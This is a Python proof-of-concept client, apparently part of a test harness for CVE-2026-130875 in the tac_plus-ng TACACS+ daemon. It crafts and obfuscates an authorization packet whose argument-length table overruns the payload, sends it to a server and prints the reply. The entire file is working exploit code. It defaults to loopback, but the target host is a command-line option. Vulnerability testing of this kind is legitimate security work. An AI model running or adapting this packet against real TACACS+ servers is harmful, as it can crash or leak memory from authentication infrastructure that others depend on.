#!/usr/bin/env python3
"""Minimal TACACS+ wire client for the CVE-2026-130875 frontier harness.

Builds one AUTHOR (or ACCT) packet with an argument-size table that sums past the
payload, obfuscates it with the pad used by the pinned md5_xor()
(tac_plus-ng/packet.c), sends it to a plant-started 127.0.0.1 daemon and prints
the reply length/bytes. Nothing here contacts anything off loopback.
"""
import argparse
import hashlib
import socket
import struct

HDR_SIZE = 12
TAC_AUTHOR_REQ_FIXED_FIELDS_SIZE = 8
TAC_ACCT_REQ_FIXED_FIELDS_SIZE = 8


def pad_for(sid, key, version, seq, prev=b""):
    return hashlib.md5(sid + key + bytes([version, seq]) + prev).digest()


def obfuscate(body, sid, key, version, seq):
    pad = pad_for(sid, key, version, seq)
    out = bytearray()
    for i in range(0, len(body), 16):
        chunk = body[i:i + 16]
        out.extend(a ^ b for a, b in zip(chunk, pad))
        pad = pad_for(sid, key, version, seq, pad)
    return bytes(out)


def build_author(arg0, rest, data, sid, key, version=0xC0, seq=1, ptype=2,
                 user_len=0, port_len=0, rem_len=0):
    # fixed fields: method, priv, authen_type, service, user_len, port_len,
    # rem_addr_len, arg_cnt
    argcnt = 1 + len(rest)
    fixed = bytes([6, 1, 1, 1, user_len, port_len, rem_len, argcnt])
    sizetable = bytes([arg0]) + bytes(rest)
    body = fixed + sizetable + data
    datalength = len(body)
    hdr = struct.pack("!BBBBI", version, ptype, seq, 0, int.from_bytes(sid, "big"))
    hdr += struct.pack("!I", datalength)
    return hdr + obfuscate(body, sid, key, version, seq)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=4949)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--key", default="demo")
    ap.add_argument("--sid", default="11223344")
    ap.add_argument("--arg0", type=int, default=4)
    ap.add_argument("--rest", type=int, default=254, help="count of 0xff table entries")
    ap.add_argument("--rest-byte", type=int, default=0xFF)
    ap.add_argument("--data", default="cmd=")
    ap.add_argument("--ptype", type=int, default=2)
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--user-len", type=int, default=0)
    ap.add_argument("--timeout", type=float, default=2.0)
    args = ap.parse_args()

    sid = bytes.fromhex(args.sid)
    rest = [args.rest_byte] * args.rest
    pkt = build_author(args.arg0, rest, args.data.encode(), sid,
                       args.key.encode(), seq=args.seq, ptype=args.ptype,
                       user_len=args.user_len)
    s = socket.create_connection((args.host, args.port), timeout=args.timeout)
    s.settimeout(args.timeout)
    s.sendall(pkt)
    try:
        reply = s.recv(65536)
    except socket.timeout:
        reply = b""
    s.close()
    print(f"sent={len(pkt)} reply_len={len(reply)} reply={reply[:64].hex()}")


if __name__ == "__main__":
    main()
